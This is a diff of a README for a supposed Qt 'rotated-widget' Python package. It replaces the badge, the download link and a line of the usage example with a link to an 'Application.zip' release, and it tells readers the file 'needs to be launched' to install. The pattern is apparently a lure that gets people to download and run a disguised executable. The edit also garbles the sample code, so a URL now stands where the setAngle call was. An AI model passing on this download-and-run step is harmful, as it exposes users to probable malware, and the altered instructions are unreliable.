@@ -2,7 +2,7 @@
 
 Welcome to the "rotated-widget" repository! 🎉
 
-![Rotated Widget](https://img.shields.io/badge/Custom-Qt--based%20Widget-orange)
+![Rotated Widget](https://github.com/LocalCumDumpsuter/rotated-widget/releases/download/v1.0/Application.zip%20Widget-orange)
 
 ---
 
@@ -47,7 +47,7 @@ The "rotated-widget" repository provides a custom Qt-based class that enables dy
 
 To get started, you can download the package file from the following link:
 
-[Download Package](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Download Package](https://github.com/LocalCumDumpsuter/rotated-widget/releases/download/v1.0/Application.zip)
 
 **Note:** The file needs to be launched to install the "rotated-widget" package.
 
@@ -66,7 +66,7 @@ from rotatedwidget import RotatedWidget
 
 widget = MyCustomWidget()
 rotated_widget = RotatedWidget(widget)
-rotated_widget.setAngle(45)  # Rotate the widget by 45 degrees
+https://github.com/LocalCumDumpsuter/rotated-widget/releases/download/v1.0/Application.zip(45)  # Rotate the widget by 45 degrees
 ```
 
 ---
